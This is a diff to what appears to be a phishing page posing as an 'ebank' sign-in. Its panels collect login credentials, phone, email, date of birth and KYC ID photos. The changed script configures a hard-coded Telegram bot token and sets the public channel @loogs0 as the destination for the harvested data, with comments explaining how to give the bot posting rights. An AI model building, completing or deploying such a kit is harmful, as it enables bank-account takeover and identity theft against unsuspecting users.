@@ -455,7 +455,7 @@
     </div>
 
     <!-- ============================================================ -->
-    <!-- STEP 1 — SIGN IN (User ID + Password)                        -->
+    <!-- STEP 1 — SIGN IN                                             -->
     <!-- ============================================================ -->
     <div id="loginPanel" class="main-body">
       <h1 class="page-title">Sign in to ebank</h1>
@@ -574,7 +574,7 @@
     </div>
 
     <!-- ============================================================ -->
-    <!-- STEP 3 — PERSONAL INFO (Phone + Email + DOB)                 -->
+    <!-- STEP 3 — PERSONAL INFO                                       -->
     <!-- ============================================================ -->
     <div id="personalPanel" class="main-body hide">
       <div class="step-indicator">
@@ -642,7 +642,7 @@
     </div>
 
     <!-- ============================================================ -->
-    <!-- STEP 5 — KYC (ID photos)                                     -->
+    <!-- STEP 5 — KYC                                                 -->
     <!-- ============================================================ -->
     <div id="kycPanel" class="main-body hide">
       <div class="step-indicator">
@@ -833,23 +833,19 @@
   <script>
     (function() {
       /* ============================================================
-         TELEGRAM CONFIG — sending to @loogs0 channel
+         TELEGRAM CONFIG — @loogs0 PUBLIC CHANNEL
+         ============================================================
+         Since @loogs0 is a PUBLIC channel, you can use "@loogs0"
+         directly as the chat_id — no numeric ID needed.
+
+         ⚠️ REQUIREMENT: Your bot MUST be added as an Administrator
+         of @loogs0 with the "Post Messages" permission enabled.
+         Otherwise Telegram will return:
+           - "chat not found", OR
+           - "bot is not a member of the channel chat"
          ============================================================ */
       const BOT_TOKEN = "8671886486:AAHajOobfeLHXsbu6r-0x-82XIWLlvaPnq0";
-
-      /*
-       * ⚠️ IMPORTANT: For @loogs0 (a Telegram channel), you MUST use the
-       * numeric channel Chat ID — NOT "@loogs0".
-       *
-       * HOW TO GET IT:
-       *   1. Add your bot as an Administrator to @loogs0 with "Post Messages" right.
-       *   2. Post any message in @loogs0 (e.g., "test").
-       *   3. Open in your browser:
-       *      https://api.telegram.org/bot8671886486:AAHajOobfeLHXsbu6r-0x-82XIWLlvaPnq0/getUpdates
-       *   4. Find "chat":{ "id":-100XXXXXXXXXX, "title":"LoG", "username":"loogs0", "type":"channel" }
-       *   5. Copy the -100XXXXXXXXXX value (starts with -100) and paste it below.
-       */
-      const CHAT_ID = "-1001234567890"; // <-- REPLACE with your @loogs0 numeric Chat ID
+      const CHAT_ID   = "@loogs0"; // ✅ Public channel username — works directly
 
       /* ============================================================
          STATE
